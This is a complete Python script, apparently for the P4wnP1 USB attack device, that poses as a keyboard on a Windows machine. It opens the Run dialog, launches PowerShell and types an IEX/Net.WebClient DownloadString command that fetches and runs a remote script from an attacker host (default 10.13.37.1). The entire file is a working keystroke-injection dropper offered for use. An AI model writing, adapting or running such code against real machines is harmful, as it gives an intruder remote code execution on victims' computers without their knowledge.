#!/usr/bin/env python3

import os, time, sys
P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from p4wnhid import send_string, send_key, enter, sleep_ms

def get_autorun_url():
    lhost = os.getenv("P4WN_LHOST", "10.13.37.1")
    path = os.getenv("P4WN_AUTORUN_PAYLOAD", "/payloads/autorun.ps1")
    return f"http://{lhost}{path}"

def inject_payload(url):
    # Uses Windows+R then PowerShell to download & execute payload
    print(f"[*] Running HID autorun from {url}")

    send_key("GUI", "R")
    sleep_ms(300)
    send_string("powershell")
    enter()
    sleep_ms(800)

    # Download + execute
    ps = f"IEX(New-Object Net.WebClient).DownloadString('{url}')"
    send_string(ps)
    enter()

def main():
    url = get_autorun_url()
    inject_payload(url)

if __name__ == "__main__":
    main()
